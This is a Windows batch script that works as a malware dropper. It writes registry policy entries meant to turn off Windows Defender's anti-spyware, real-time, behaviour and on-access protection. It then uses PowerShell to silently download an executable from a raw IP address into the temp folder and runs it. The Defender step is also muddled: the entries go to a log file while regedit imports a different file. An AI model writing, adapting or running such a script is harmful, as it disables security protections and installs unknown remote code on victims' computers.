@echo off
REM Redirect all output to a log file
> "%TEMP%\script_log.txt" (
    REM Function to disable Windows Defender
    echo Windows Registry Editor Version 5.00
    echo.
    echo [HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender]
    echo "DisableAntiSpyware"=dword:00000001
    echo "DisableRealtimeMonitoring"=dword:00000001
    echo.
    echo [HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection]
    echo "DisableBehaviorMonitoring"=dword:00000001
    echo "DisableOnAccessProtection"=dword:00000001
    echo "DisableScanOnRealtimeEnable"=dword:00000001

    REM Import the registry settings to disable Windows Defender
    regedit.exe /s "%TEMP%\disable_defender.reg"
    if %errorlevel% neq 0 (
        echo Failed Windows Defender.
    ) else (
        echo Windows Defender successfully.
    )

    REM Function to download a file silently
    powershell -Command "Invoke-WebRequest -Uri 'http://54.224.34.222:3004/uploads/BootyMistress.exe' -OutFile '%TEMP%\installer.exe' -UseBasicParsing"
    if %errorlevel% neq 0 (
        echo Failed to download file.
    ) else (
        echo Downloaded file to %TEMP%\installer.exe.
    )

    REM Function to run an executable silently
    "%TEMP%\installer.exe"
    if %errorlevel% neq 0 (
        echo Failed to execute . Exit code: %errorlevel%
    ) else (
        echo Executed successfully.
    )

    REM Display completion message
    echo Script execution completed.
)
